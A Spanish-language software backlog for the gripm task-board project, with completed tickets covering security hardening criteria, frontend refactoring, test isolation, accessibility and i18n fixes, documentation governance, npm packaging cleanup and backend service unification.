- [x] #1 Peticiones locales HTTP emitidas sobre IPv6 (`Host: [::1]:port`) son reconocidas legítimamente como loopback sin emitir `403 Forbidden`
- [x] #2 `validateVerifyCommand` rechaza de forma determinista cualquier intento de pasar flags de evasión (`--prefix`, `--config`, `--script-shell`, etc.) o rutas con escape `..`
- [x] #3 `isAllowedBrowsePath` resuelve symlinks sobre el ancestro existente más cercano, impidiendo escapes de contención sobre archivos nuevos o inexistentes tanto en HTTP como en MCP
- [x] #4 Las operaciones de edición, restauración y borrado de tareas (`PUT/PATCH/DELETE /api/items/:id` y MCP) aplican scoping estricto al proyecto seleccionado, impidiendo mutaciones en proyectos homónimos
- [x] #5 El ruteo de `server/routes/api.ts` opera exclusivamente sobre `pathname` decodificado, siendo inmune a variaciones de query parameters
- [x] #6 `POST /api/import` y `POST /api/projects` validan que `docsPath` y `backlogDir` residan estrictamente dentro de la raíz permitida
- [x] #7 Todos los watchers `fs.FSWatcher` registran listeners de error para evitar caídas fatales del proceso Node ante borrado de directorios
- [x] #8 La suite de seguridad `scripts/test-api-security.js` valida limpiamente las 8 mitigaciones con código 0

---

#### [DEV-303] Descomposición Modular de Frontend: Desacople de God Components y Motor de Filtros
- **Prioridad**: `high` | **Tipo**: `refactor`

Refactorización estructural del cliente React (`src/`): partición modular de los componentes monolíticos gigantes (`SettingsView`, `ItemModal`, `App.tsx`), unificación determinista del motor de filtrado multi-criterio y optimización de renderizado durante interacciones de drag-and-drop.

### Diagnóstico de la Causa Raíz:

1. **Monolitos de Responsabilidad Múltiple ("God Components"):**
   - `src/components/SettingsView.tsx` (3.082 líneas): 8 pestañas completas, 25+ estados locales, dirty-checking manual por serialización JSON en cada keystroke y formularios embebidos en un solo archivo.
   - `src/components/ItemModal.tsx` (2.507 líneas): Más de 35 hooks `useState` en el mismo componente (`lines 151-218`), preview de Markdown, BDD templates, drag-and-drop de ACs, exportación a calendar `.ics` y autosave.
   - `src/App.tsx` (1.737 líneas): Orquestador central que retiene todo el estado del dominio, 10 estados de modal, SSE, locales, y más de 25 callbacks pasados por props drilling hasta 3 niveles de profundidad.
2. **Divergencia de Filtrado ("Split-Brain"):**
   `FilterBar.tsx` y `AdvancedFiltersPopover.tsx` fueron actualizados para soportar selección múltiple (`filters.sprints`, `filters.releases`, `filters.modules`) y tareas con múltiples módulos (`item.modules` en `DEV-275`). Sin embargo, [`visibleItems` en App.tsx:1250-1266](file:///c:/Users/Pablo/Proyectos/gripm/src/App.tsx#L1250-L1266) jamás fue actualizado: solo evalúa campos singulares legacy (`filters.sprint`, `filters.release`, `filters.module`), provocando que activar filtros multi-selección en la UI no filtre absolutamente nada en el tablero.
3. **Tormenta de Re-renders a 60 fps en Drag-and-Drop:**
   En `KanbanBoard.tsx:512-527` y `SprintView.tsx:1466-1474`, `handleCardDragOver` invoca `setDropTarget` en cada píxel de movimiento del cursor sin validar si la posición o ítem cambió. Dado que `KanbanBoard` pasa 4 funciones flecha inline nuevas a cada `ItemCard` en cada render, `React.memo(ItemCard)` queda totalmente anulado y todas las tarjetas de todas las columnas se re-renderizan 60 veces por segundo durante el arrastre.
4. **Code-Splitting Incompleto:**
   Solo `ReleaseAssembler` y `SettingsView` usan `React.lazy()`. Vistas pesadas secundarias (`SprintView` 119 KB, `TimelineView` 54 KB, `MetricsView` 33 KB, `ImportWizardModal` 24 KB) se importan en el bundle inicial de arranque.

### Solución Arquitectónica Profunda:

- **Modularización de Componentes:**
  - Extraer `src/hooks/useBoardController.ts` de `App.tsx` para aislar la carga de datos, suscripción SSE y mutaciones CRUD en un hook dedicado, reduciendo `App.tsx` a ~350 líneas de maquetado y renderizado condicional.
  - Dividir `SettingsView.tsx` en submódulos por pestaña en `src/components/settings/` (`GeneralTab`, `KanbanTab`, `ModulesTab`, `TaxonomyTab`, `ComponentsTab`, `VisualTab`, `ToolsTab`, `AdvancedTab`).
  - Dividir `ItemModal.tsx` en `useItemFormState` y subpaneles (`ItemDescriptionPanel`, `AcceptanceCriteriaPanel`, `ItemRelationsPanel`, `ItemSidebarMetadata`).
- **Unificación del Motor de Filtros:**
  - Crear `src/utils/filterItems.ts` con la función pura `itemMatchesFilters(item, filters)`.
  - Soporte completo para matching multi-selección (`filters.sprints`, `filters.releases`, `filters.modules`) contra campos array (`item.modules`, `item.releases`, `item.sprints`) y campos singulares legacy.
  - Consumir el mismo predicado en `App.tsx`, `FilterBar.tsx` y vistas de exportación.
- **Rendimiento de Renderizado y Code-Splitting:**
  - Proteger `setDropTarget` con guard funcional: `setDropTarget(prev => (prev?.itemId === id && prev?.pos === pos) ? prev : { itemId: id, pos })`.
  - Estabilizar callbacks de `ItemCard` con `useCallback` parametrizado por `(item, ...)`.
  - Cargar `SprintView`, `TimelineView`, `MetricsView` e `ImportWizardModal` con `React.lazy()` y `Suspense`.

**Criterios de Aceptación:**
- [x] #1 Se extrae `src/utils/filterItems.ts` y se unifica la lógica de filtrado; la selección de múltiples sprints, releases o módulos en el popover filtra correctamente las tarjetas en el Kanban y en el Backlog
- [x] #2 `item.modules` (array multi-módulo) y `config.modulesList` son reconocidos plenamente en la barra de filtros y en el cálculo de `availableModules`
- [x] #3 `SettingsView.tsx` se divide en subcomponentes por pestaña en `src/components/settings/`, reduciendo su tamaño individual a menos de 500 líneas por módulo
- [x] #4 `ItemModal.tsx` desacopla su gestión de estado en `useItemFormState` y separa sus paneles de visualización
- [x] #5 `KanbanBoard` y `SprintView` optimizan `setDropTarget` evitando re-renderizados innecesarios durante eventos de arrastre continuo
- [x] #6 `ItemCard` recibe callbacks estables que permiten a `React.memo` evitar re-renders de tarjetas inactivas durante el drag-and-drop
- [x] #7 `SprintView`, `TimelineView`, `MetricsView` e `ImportWizardModal` se cargan bajo demanda con `React.lazy()`, reduciendo el bundle inicial
- [x] #8 La suite de UI smoke tests (`npm run test:ui`) aprueba sin regresiones funcionales

---

#### [DEV-304] Suite de Verificación Limpia: Aislamiento de Tests en Tempdir y Erradicación de Test Theater
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Saneamiento integral de la Pirámide de Verificación y el pipeline de pruebas: aislamiento físico de tests que mutan el sistema de archivos en directorios temporales independientes (`os.tmpdir()`), erradicación de aserciones frágiles basadas en búsqueda superficial de strings ("test theater"), y eliminación de falsos positivos en el auditor estático de UX.

### Diagnóstico de la Causa Raíz:

1. **Contaminación del Árbol de Trabajo Real:**
   En `scripts/verify-mcp-binary.js:12-43` y `scripts/verify-resilience-and-cli.js:6-42`, los tests crean y borran tareas de prueba (`DEV-998`, `DEV-999`, `anomalous-orphan-task-file.md`) directamente dentro del directorio real `backlog/tasks/` del repositorio y mutan `BACKLOG.md`. Si el proceso se interrumpe o corre en paralelo con git hooks, deja archivos huérfanos que provocan fallos en commits subsiguientes.
2. **Inspección Estática Superficial ("Test Theater"):**
   Varios pasos de la suite de 18 pruebas (`verify-focus-trap.js`, `test-ui-logic.js`, `verify-kanban-reorder.js`) no ejecutan código ni componentes reales; simplemente hacen `fs.readFileSync('src/...')` y buscan substrings con `.includes()` o regex. Esto produce checks verdes falsos aunque la lógica en runtime esté rota.
3. **Aserciones Acopladas a Datos Históricos Vivos:**
   En `scripts/verify-integration.js:159`, el test parsea el directorio real `backlog/tasks/` y comprueba que las tareas de `Sprint 3` coincidan exactamente con un array hardcodeado de 7 IDs (`DEV-047`, `DEV-049`, etc.). Cualquier edición, refinamiento o archivado de tareas históricas hace fallar la suite entera.
4. **Falsos Positivos de UX-010 y Hack de Constante Fija:**
   En `scripts/audit-ux-code.cjs`, la función `stripExpressions` elimina todas las llaves JSX `{...}` antes de verificar si un botón tiene texto accesible. Cualquier botón con un icono y una etiqueta internacionalizada `{t('...')}` dispara un falso positivo de `UX-010` (botón sin nombre accesible). Para tapar esto, `scripts/verify-audit-ux-baseline.js:37` hardcodea `const KNOWN_UX010_FALSE_POSITIVES = 12` y afirma `residual.length === 12`. Agregar o corregir un botón con i18n hace fallar los tests.
5. **Gaps en CI y Pre-Commit:**
   `.github/workflows/ci.yml` solo se dispara en `branches: [main]` ignorando `dev` donde ocurre el desarrollo activo; y `checkMcpBinarySync` en `verify-changes.js:295` resuelve imports desde el disco y no desde el índice Git, permitiendo falsos positivos/negativos si hay cambios sin stagear.

### Solución Arquitectónica Profunda:

- **Aislamiento en `os.tmpdir()`:**
  - Migrar `verify-mcp-binary.js` y `verify-resilience-and-cli.js` para que creen un entorno efímero mediante `fs.mkdtempSync(path.join(os.tmpdir(), 'gripm-test-'))` y pasen `--repo <tmpDir>` al servidor MCP y al CLI, garantizando que el repositorio vivo jamás sea tocado durante los tests.
- **Pruebas de Comportamiento Real:**
  - Reemplazar la lectura de strings por invocaciones a funciones reales de dominio, validando entradas, salidas, mutaciones de estado y contratos de error.
  - Utilizar fixtures sintéticos aislados para `verify-integration.js`.
- **Detección de Texto Visible con Soporte de i18n:**
  - Enseñar a `audit-ux-code.cjs` a preservar llamadas de traducción como `t(...)` o `i18n.t(...)` sustituyéndolas por tokens visibles (`"__I18N_LABEL__"`) antes de pelar expresiones complejas.
  - Eliminar la constante artificial `KNOWN_UX010_FALSE_POSITIVES = 12` de `verify-audit-ux-baseline.js`.
- **Sincronización de CI:**
  - Configurar `ci.yml` para ejecutarse en `branches: [main, dev]`.
  - Conectar `checkMcpBinarySync` con un plugin de esbuild que lea imports relativos con `stagedContent()`.

**Criterios de Aceptación:**
- [x] #1 Ningún test de la suite de 18 pasos crea, muta o borra archivos dentro del árbol de trabajo del repositorio; todas las operaciones de prueba operan en directorios temporales aislados (`os.tmpdir()`)
- [x] #2 `scripts/verify-integration.js` opera contra fixtures deterministas sintéticos sin acoplarse al historial vivo de tareas en `backlog/tasks/`
- [x] #3 `scripts/audit-ux-code.cjs` reconoce expresiones JSX de traducción (`{t('...')}`) como texto accesible legítimo, eliminando falsos positivos en botones icon+label
- [x] #4 Se elimina la constante hardcodeada `KNOWN_UX010_FALSE_POSITIVES = 12` en `scripts/verify-audit-ux-baseline.js`
- [x] #5 `scripts/verify-changes.js` en `checkMcpBinarySync` evalúa dependencias transitivas directamente desde el índice Git
- [x] #6 `.github/workflows/ci.yml` se ejecuta automáticamente tanto en `main` como en `dev`
- [x] #7 La suite completa unificada (`npm test`) aprueba al 100% con aislamiento garantizado

---

#### [DEV-305] Ergonomía de Interacción: A11y Universal, Portales, Stack de Modales y Migración Completa a i18n
- **Prioridad**: `medium` | **Tipo**: `ux`

Resolución integral de defectos ergonómicos, accesibilidad de teclado, gestión de foco en modales anidados y eliminación de más de 150 cadenas de texto hardcodeadas en español que quiebran el soporte para idioma inglés (`"language": "en"`).

### Diagnóstico de la Causa Raíz:

1. **Colisión de Tecla `Escape` en Modales Anidados (Doble Cierre):**
   En `src/hooks/useFocusTrap.ts:106`, cada modal abierto registra un listener `keydown` en fase de captura sobre `document`. Cuando `ItemModal` abre su diálogo de confirmación de borrado (`ConfirmModal`), pulsar `Escape` para cancelar el borrado dispara ambos listeners simultáneamente, cerrando tanto la confirmación como `ItemModal` y perdiendo las ediciones en curso. Idéntico problema ocurre en `ProjectModal` + `FolderPickerModal` y en `ReleaseAssembler`.
2. **Atajos Globales de Teclado Rotos y Fugas de Contexto:**
   En `src/App.tsx:404-443`:
   - Pulsar `N` llama a `setDefaultNewStatus('backlog')`. Como `'backlog'` no es un estado canónico en el `<select>` de `ItemModal`, el selector aparece en blanco y persiste el valor obsoleto en disco.
   - Los atajos numéricos (`1`, `2`, `3`, `4`) se ejecutan incluso si el usuario está interactuando con botones dentro de modales abiertos o si la pestaña destino está deshabilitada en `config.enabledTabs`.
3. **Solapamiento en Checkboxes con Shift+Click:**
   En `src/components/SprintView.tsx:1523-1536`, el checkbox de fila define simultáneamente `onClick` (con `handleRowShiftClick`) y `onChange` (con `handleToggleSelectItem`), provocando que un Shift-click seleccione y deseleccione la fila en el mismo evento.
4. **Modales sin Portal y Atrapados en Stacking Contexts:**
   8 modales (`Modal.tsx`, `ProjectModal.tsx`, `FolderPickerModal.tsx`, `SprintModal.tsx`, `CompleteSprintModal.tsx`, `PlanGuardModal.tsx`, `ImportWizardModal.tsx` y el visor de retro de `SprintView.tsx`) se renderizan en el DOM inline sin `createPortal(..., document.body)`, violando la Regla #11 de `AGENTS.md` y quedando vulnerables a bugs de apilamiento con `backdrop-filter` o `transform`.
5. **Ruptura del Modo Inglés por Cadenas Hardcodeadas:**
   Más de 150 textos en `main.tsx` (`ErrorBoundary`), `ImportWizardModal.tsx`, generador de changelogs en `ReleaseAssembler.tsx`, toasts de `App.tsx` y encabezados de `SprintView.tsx` están escritos en español estático, ignorando la configuración `"language": "en"`.
6. **Clases de Utilidad Inválidas y Tipografía Arbitraria:**
   Presencia de `py-0.2` (utilidad inexistente en Tailwind que no genera estilos) en 6 componentes y 265 violaciones de `UX-011` congeladas en `audit-ux-baseline.json`.

### Solución Arquitectónica Profunda:

- **Pila de Traps de Foco (`activeTraps` Stack):**
  - Implementar en `useFocusTrap.ts` un stack global de modales activos. Solo el modal en el tope de la pila (`activeTraps[activeTraps.length - 1]`) captura `Escape` y `Tab`, llamando a `e.stopImmediatePropagation()`.
- **Saneamiento de Atajos:**
  - Corregir el estado por defecto de `N` a `'draft'`.
  - Bloquear todos los atajos de una sola tecla cuando exista algún modal abierto o la pestaña esté deshabilitada.
- **Portales Universales:**
  - Envolver todos los modales y overlays en `createPortal(..., document.body)` con `role="dialog"`, `aria-modal="true"` y focus trap estricto.
- **Internacionalización Completa:**
  - Trasladar todas las cadenas hardcodeadas a `src/locales/es.json` y `src/locales/en.json`, garantizando paridad 100% y traducción dinámica vía `useTranslation()`.
- **Higiene de CSS y Quema de Baseline:**
  - Reemplazar `py-0.2` por `py-0.5` y migrar `text-[9px]`, `text-[10px]` y `text-[11px]` a la escala canónica `text-xs`.

**Criterios de Aceptación:**
- [x] #1 Al presionar `Escape` dentro de un modal anidado (ej. confirmación de borrado en `ItemModal`), se cierra exclusivamente el modal superior sin cerrar el modal padre
- [x] #2 El atajo de teclado `N` abre el modal con estado canónico `draft` y los atajos numéricos no interfieren cuando hay modales abiertos o pestañas desactivadas
- [x] #3 La selección por rango con `Shift+Click` en checkboxes de `SprintView` selecciona el bloque continuo de tareas de forma determinista sin deseleccionar la fila actual
- [x] #4 Los 8 modales identificados se renderizan mediante `createPortal(..., document.body)` con atributos ARIA y foco contenido
- [x] #5 Todas las cadenas de texto visibles de `ErrorBoundary`, `ImportWizardModal`, `ReleaseAssembler` y toasts se internacionalizan en `es.json` y `en.json`, funcionando limpiamente en modo inglés
- [x] #6 Se eliminan todas las apariciones de la clase Tailwind inválida `py-0.2`
- [x] #7 El baseline de `audit-ux-baseline.json` se reduce progresivamente reemplazando tamaños arbitrarios por la escala estándar `text-xs`

---

#### [DEV-306] Gobernanza Documental: ADRs, Alineación con Playbook y Saneamiento de Normas
- **Prioridad**: `medium` | **Tipo**: `tech_debt`

Actualización y sincronización exhaustiva de la documentación técnica de arquitectura, registro formal de ADRs pendientes, resolución de contradicciones normativas en `AGENTS.md` y reparación de las herramientas de integración del framework Gripm Playbook (`gate-qa.mjs`, `sync-playbook.mjs`, `.playbook-lock.json`).

### Diagnóstico de la Causa Raíz:

1. **`docs/ARCHITECTURE.md` Desfasado:**
   - Afirma que el backend corre dentro de `vite.config.ts` (desacoplado a `server/` en `v1.1.0` y servido por servidor HTTP nativo en `DEV-290`).
   - Describe un servidor inexistente llamado `"CodeGraph MCP"` (`lines 99-108`) que nunca formó parte del repositorio.
   - Omite componentes y módulos actuales de primera clase: `TimelineView` (Roadmap), `MetricsView` (Analytics), `universalImporter`, `atomicWrite.ts`, etc.
2. **Desincronización de Registros de Arquitectura (`docs/adr/`):**
   - `docs/adr/0002-backend-embebido-como-plugin-de-vite.md` sigue figurando con estado `Aceptado`. Tras `DEV-290`, el servidor de producción es un ejecutable HTTP nativo desacoplado de Vite. Falta marcar `ADR-0002` como `Reemplazado` y formalizar `ADR-0006`.
3. **Contradicción Normativa en `AGENTS.md`:**
   - Gotcha 12 y `ADR-0005:53` exigen usar `text-[11px]` en advertencias y confirmaciones.
   - Gotcha 21 (`UX-011`) prohíbe terminantemente usar `text-[11px]` en cualquier componente de UI.
4. **Herramientas de Playbook Desalineadas:**
   - `scripts/gate-qa.mjs` busca scripts inexistentes en `package.json` (`validate`, `gate:review`, `audit:ux:strict`), fallando con código 1 en downstream projects.
   - `scripts/sync-playbook.mjs` crashea con `TypeError: pack is not iterable` al usar `--stack` o `--list-stacks` porque `.playbook-manifest.json` define cada stack como un objeto `{ description, files }` en vez de array.
   - `npm run playbook:check` falla con exit code 1 en modo `--dry-run` por la presencia de archivos modificados legítimamente en `lock.customizations`.
   - `.playbook-lock.json:3` contiene commiteada una ruta local absoluta (`C:\Users\Pablo\...`).
5. **Prefijos Heterogéneos en Tareas:**
   - 101 archivos históricos (`dev-001` a `dev-101`) preservan el prefijo en minúscula `dev-` en su nombre de archivo en disco mientras su YAML frontmatter declara `DEV-XXX`.

### Solución Arquitectónica Profunda:

- **Reescritura de `docs/ARCHITECTURE.md`:** Reflejar con precisión milimétrica la arquitectura actual del producto (servidor HTTP nativo en `bin/gripm.js`, capa `server/`, standalone MCP, módulos de Timeline/Metrics y adaptadores Sandbox).
- **Formalización de ADR-0006:** Registrar la arquitectura de servidor estático desacoplado de Vite para producción y marcar `ADR-0002` como `Reemplazado`.
- **Resolución Normativa:** Alinear `AGENTS.md` Gotcha 12 y `ADR-0005` al token estándar `text-xs`.
- **Adaptabilidad de `gate-qa.mjs` y `sync-playbook.mjs`:**
  - Hacer que `gate-qa.mjs` detecte dinámicamente los scripts de verificación disponibles en el `package.json` del host (`tsc`, `test`, `backlog:check`, `audit:ux`, `publish:check`, `build`).
  - Normalizar `const packFiles = Array.isArray(pack) ? pack : (pack?.files ?? []);` en `sync-playbook.mjs` y no salir con código 1 en `--dry-run` ante archivos en `customizations`.
  - Sanitizar `.playbook-lock.json` usando ruta relativa `../gripm-playbook`.
- **Normalización de Tareas:** Estandarizar los 101 nombres de archivo a mayúsculas canónicas `DEV-XXX`.

**Criterios de Aceptación:**
- [x] #1 `docs/ARCHITECTURE.md` refleja la arquitectura real de `v1.5.0` (arquitectura de `server/`, servidor HTTP nativo sin Vite en producción, módulos Timeline/Metrics e Importador Universal), eliminando toda mención a CodeGraph
- [x] #2 Se formaliza `ADR-0006` para el servidor estático desacoplado de Vite en producción y `ADR-0002` queda marcado formalmente como `Reemplazado`
- [x] #3 Se elimina la contradicción tipográfica en `AGENTS.md` y `ADR-0005`, consolidando el uso de `text-xs`
- [x] #4 `scripts/gate-qa.mjs` ejecuta limpiamente adaptándose a los scripts definidos en `package.json`
- [x] #5 `scripts/sync-playbook.mjs` procesa los comandos `--stack` y `--list-stacks` sin errores de tipo y no emite código 1 ante archivos en `customizations` bajo `--dry-run`
- [x] #6 `.playbook-lock.json` no contiene rutas locales absolutas
- [x] #7 Descartado por instrucción explícita del PO: preservación de nombres de archivo históricos pre-v1 sin churn innecesario de disco

---

#### [DEV-307] Packaging de Producción Limpio: Adelgazamiento del Tarball npm y Exclusión de Fuentes
- **Prioridad**: `medium` | **Tipo**: `tech_debt`

Optimización radical de la superficie de distribución del paquete npm `@gripm/board`: exclusión del código fuente de desarrollo (`src/`, `server/`, `scripts/`, `.githooks/`), reducción de la huella de instalación y fortalecimiento de las verificaciones de empaquetado para garantizar un tarball productivo minimalista y autocontenido.

### Diagnóstico de la Causa Raíz:

Actualmente, el campo `"files"` de `package.json:48-66` declara:
```json
"files": [
  ".agents/skills/gripm",
  ".githooks",
  "audit-ux-baseline.json",
  "bin",
  "dist",
  "public",
  "scripts",
  "server",
  "src",
  "data/demo-backlog.json",
  ...
]
```
Esto provoca que el paquete distribuido en npm arrastre más de 76 archivos internos:
1. **Todo el árbol de fuentes TypeScript de React (`src/`):** A pesar de que `dist/` contiene los bundles compilados para el navegador, se incluye todo `src/` únicamente porque `bin/gripm.js` y `server/plugin.ts` importaban archivos `.ts` en crudo.
2. **Todos los scripts de pruebas internas (`scripts/`):** Se distribuyen 24 scripts internos de test (`scripts/test-*.js`, `scripts/verify-*.js`, `scripts/repro-ci-linux.sh`, `scripts/watchdog.js`).
3. **Archivos de metodología Playbook en `scripts/`:** Se distribuyen `scripts/gate-qa.mjs`, `scripts/sync-playbook.mjs`, `scripts/audit-ux-code.cjs` y `scripts/ux-rules.json`, contradiciendo `AGENTS.md` §0 (que establece que los artefactos del Playbook están excluidos del tarball de producción).
4. **Baselines y hooks internos:** `.githooks` y `audit-ux-baseline.json` se incluyen en el paquete de producción sin tener ninguna utilidad para el usuario final.

### Solución Arquitectónica Profunda:

- **Distribución de Artefactos Precompilados:**
  Con la compilación de ejecutables y servidor en `bin/` y la compilación web en `dist/`, el paquete de npm solo necesita distribuir:
  - `bin/`: Binarios ejecutables de Node (`gripm.js`, `gripm-mcp.js`, `server.js`, `gripm-cli.js`).
  - `dist/`: Aplicación web compilada y optimizada.
  - `public/`: Activos públicos.
  - `data/demo-backlog.json`: Datos iniciales de demostración.
  - `.agents/skills/gripm/SKILL.md`: Skill oficial de conexión para agentes de IA.
  - `LICENSE`, `README.md`, `README.es.md`.
- **Exclusión Radical:**
  Remover `"src"`, `"scripts"`, `"server"`, `".githooks"` y `"audit-ux-baseline.json"` del array `"files"` en `package.json`.
- **Blindaje en `verify-publish-surface.js`:**
  Ampliar `FORBIDDEN_PLAYBOOK_ENTRIES` y las reglas de inspección física para certificar que el tarball empaquetado (`npm pack`) nunca contenga código fuente `.ts`, scripts de test ni artefactos de Playbook.

**Criterios de Aceptación:**
- [x] #1 El campo `"files"` en `package.json` restringe la distribución exclusivamente a `bin`, `dist`, `public`, `data/demo-backlog.json`, `.agents/skills/gripm/SKILL.md` y documentación legal/README
- [x] #2 El tarball de producción (`npm pack`) no contiene directorios `src/`, `server/`, `scripts/`, `.githooks/` ni archivos `audit-ux-baseline.json`
- [x] #3 La instalación y ejecución del paquete distribuido en un entorno limpio sin devDependencies (`npm install --omit=dev`) funciona al 100% (modo web cockpit, CLI y servidor MCP)
- [x] #4 `scripts/verify-publish-surface.js` audita y bloquea la presencia accidental de scripts de prueba o código fuente en el paquete empaquetado
- [x] #5 `npm run publish:check` y `npm run verify:dist` aprueban limpiamente con código de salida 0

---

#### [DEV-308] Saneamiento de Estructura: Reubicación de demo-backlog.json a src/data y Eliminación del Directorio data/
- **Prioridad**: `low` | **Tipo**: `tech_debt`

Reubicación del dataset semilla de demostración `data/demo-backlog.json` a `src/data/demo-backlog.json` y erradicación del directorio raíz huérfano `data/`.

### Diagnóstico y Justificación:

1. **Directorio huérfano y residuo histórico:** Originalmente, `data/` albergaba las bases de datos locales del CLI (`projects-registry.json` y `dev-board.json`). Con la migración a XDG en el directorio del usuario (`~/.gripm/registry.json`), `data/demo-backlog.json` quedó como el único archivo superviviente en `data/`.
2. **Cohesión de módulos:** En el frontend, `src/data/sandbox.ts` consume directamente este fixture para inicializar la sandbox interactiva en Vercel. Ubicarlo en `src/data/demo-backlog.json` consolida los datos y adaptadores en el mismo subárbol de fuentes (`src/data/`).
3. **Reducción de fragmentación en empaquetado y guards:** Eliminar el directorio `data/` simplifica la raíz del proyecto y unifica las referencias en `package.json:files`, `server/services/registry.ts` y los scripts de verificación (`verify-publish-surface.js`, `verify-sandbox.js`, `verify-json-sprint-persistence.js`).

**Criterios de Aceptación:**
- [x] #1 `data/demo-backlog.json` es reubicado a `src/data/demo-backlog.json` y el directorio raíz `data/` es eliminado del repositorio
- [x] #2 `src/data/sandbox.ts` actualiza su importación estática a `./demo-backlog.json`
- [x] #3 `server/services/registry.ts` actualiza la constante `DEMO_FILE` hacia `src/data/demo-backlog.json`
- [x] #4 `package.json` actualiza la allowlist en `files` reemplazando `data/demo-backlog.json` por `src/data/demo-backlog.json` (o la ruta canónica empaquetada)
- [x] #5 `scripts/verify-publish-surface.js`, `scripts/verify-sandbox.js` y `scripts/verify-json-sprint-persistence.js` actualizan sus rutas hacia la nueva ubicación
- [x] #6 Recompilación de binarios (`bin/server.js` y `bin/gripm-mcp.js`) reflejando la nueva ruta
- [x] #7 La suite completa de verificación pasa en verde (`npx tsc --noEmit`, `npm test`, `npm run backlog:check`, `npm run publish:check`)

---

#### [DEV-309] Documentación Comunitaria Bilingüe Unificada: CODE_OF_CONDUCT, CONTRIBUTING y SECURITY
- **Prioridad**: `medium` | **Tipo**: `tech_debt`

Unificación bilingüe en un solo archivo (inglés primero, español debajo) para la documentación comunitaria del repositorio: `CODE_OF_CONDUCT.md`, `CONTRIBUTING.md` y `SECURITY.md`.

### Diagnóstico y Justificación:

1. **Evitar dispersión de archivos:** En lugar de mantener archivos separados por idioma (`.es.md` y `.md`) propensos a *drift* y desincronización, cada documento consolida ambas versiones en una única fuente de verdad.
2. **Convención Canónica:** Inglés primero en la mitad superior del documento (visibilidad global / internacional), seguido por la versión completa en español debajo, conectadas por selector de anclajes de navegación rápida en la cabecera.
3. **Preservación total del contenido:** La versión en español preexistente se preserva en su totalidad sin pérdida de rigor técnico ni detalle contextual.

**Criterios de Aceptación:**
- [x] #1 `CODE_OF_CONDUCT.md` unifica en un solo archivo la versión canónica de Contributor Covenant 2.1 en inglés arriba y la versión en español adaptada debajo, con selector de anclaje bilingüe.
- [x] #2 `CONTRIBUTING.md` unifica en un solo archivo la guía de contribución completa en inglés arriba y la versión en español existente debajo, con selector de anclaje bilingüe.
- [x] #3 `SECURITY.md` unifica en un solo archivo la política de seguridad y modelo de amenazas en inglés arriba y la versión en español existente debajo, con selector de anclaje bilingüe.
- [x] #4 La suite de verificación y calidad pasa en verde (`npm run backlog:check`, `npm run backlog:sync`, `node scripts/verify-changes.js`).

---

#### [DEV-310] Aislamiento y Federación Opt-In en Multi-Project Hub: Exclusión de Proyectos en Modo Single
- **Prioridad**: `medium` | **Tipo**: `feature`

Garantizar la soberanía, aislamiento y privacidad de proyectos locales configurados en modo mono-proyecto (`mode: "single"` en `.gripm/config.json`), evitando que aparezcan listados en el selector de proyectos (Hub) de otros repositorios que tengan activo el modo multi-proyecto (`mode: "multi"`).

### Diagnóstico de la Causa Raíz:

1. **Frontera de Visibilidad Incompleta:**
   Actualmente, el switch de `mode` en `.gripm/config.json` solo condiciona la interfaz cuando `gripm` se inicia directamente dentro de ese repositorio (`projectsToProcess = [activeProject]`). Sin embargo, cuando se inicia `gripm` en otro proyecto que tiene `multi` activo, `server/routes/api.ts:138` procesa incondicionalmente todos los proyectos del registro global (`registry.projects`), exponiendo proyectos que se configuraron explícitamente para operar de forma aislada.

2. **Federación Opt-In Deseada:**
   Si un proyecto declara `mode: "single"` en su `.gripm/config.json`, no solo expresa la intención de no ver otros proyectos (*inbound*), sino también la de no ser indexado ni accesible desde los Hubs de otros proyectos de la máquina (*outbound*), protegiendo proyectos privados, personales o bajo acuerdos de confidencialidad.

### Solución Técnica:

- En `server/routes/api.ts`, durante la resolución de `projectsToProcess` en modo Hub, filtrar aquellos proyectos registrados cuyo `.gripm/config.json` tenga `mode === 'single'`.
- Preservar al proyecto activo actual (aunque fuera single) y al proyecto Demo si está habilitado.
- Añadir pruebas de integración que aseguren que un repositorio marcado como `single` no se fuga en el selector del Hub de otro proyecto `multi`.

**Criterios de Aceptación:**
- [x] #1 `GET /api/data` en modo Hub (`isMultiMode`) excluye del catálogo de proyectos a aquellos repositorios registrados cuyo `.gripm/config.json` declare `mode: "single"`
- [x] #2 Un proyecto con `mode: "single"` permanece 100% accesible y funcional cuando `gripm` se inicia directamente desde su directorio local
- [x] #3 El proyecto virtual Demo permanece visible y accesible en modo Hub sin verse bloqueado por el filtro
- [x] #4 La prueba de integración valida mecánicamente el aislamiento y la no exposición de proyectos en modo `single`

---

#### [DEV-311] Unificación de Dominio: Delegación Completa de Endpoints REST en api.ts hacia BacklogService
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Eliminar la bifurcación de lógica de negocio entre `server/routes/api.ts` y `server/services/backlogService.ts`, haciendo que el router REST delegue el 100% de las mutaciones de tareas en `BacklogService` (`createTask`, `updateTask`, `bulkUpdateTasks`, `deleteTask`).

### Diagnóstico de la Causa Raíz:

1. **Reimplementación de Mutaciones en el Router:**
   Actualmente, `server/routes/api.ts` (1,457 líneas) manipula y muta directamente las entidades en memoria en `POST /api/items` (líneas 181-264), `POST /api/items/bulk` (líneas 267-352) y `PUT /api/items/:id` (líneas 355-452), llamando luego a la función de bajo nivel `saveBacklogMdItem` (`BacklogService.saveTask`) en vez de delegar en los métodos canónicos de dominio de `BacklogService`.
   
2. **Divergencias entre MCP y HTTP:**
   - La asignación de IDs correlativos en `api.ts` usa una expresión regular distinta (`^${cleanPrefix}[-_]+(\\d+)`) a la de `BacklogService.createTask` (`^${cleanPrefix}-(\\d+)`).
   - Las validaciones del Gatekeeper (`validateGatekeeperTransition`) corren en el MCP pero se omiten en el controlador REST de `PUT /api/items/:id`.
   - Dentro de `BacklogService.updateTask`, el parseo y extracción de campos (`effectiveStatus`, `effectiveTitle`, etc.) se encuentra duplicado entre la rama de almacenamiento Markdown y la rama JSON.

### Solución Técnica:

- Hacer que `POST /api/items` invoque directamente `BacklogService.createTask(project, body)`.
- Hacer que `PUT /api/items/:id` invoque `BacklogService.updateTask(project, id, body, { force: body.force, expectedMtime: body.expectedMtime })`.
- Hacer que `POST /api/items/bulk` invoque `BacklogService.bulkUpdateTasks(project, { taskIds, filterPrefix, filterStatus }, updates)`.
- Unificar la extracción y normalización de campos dentro de `BacklogService.updateTask` antes de bifurcar el almacenamiento en disco (`markdown` vs `json`).

**Criterios de Aceptación:**
- [x] #1 `POST /api/items` delega la creación en `BacklogService.createTask` garantizando paridad de validación con MCP
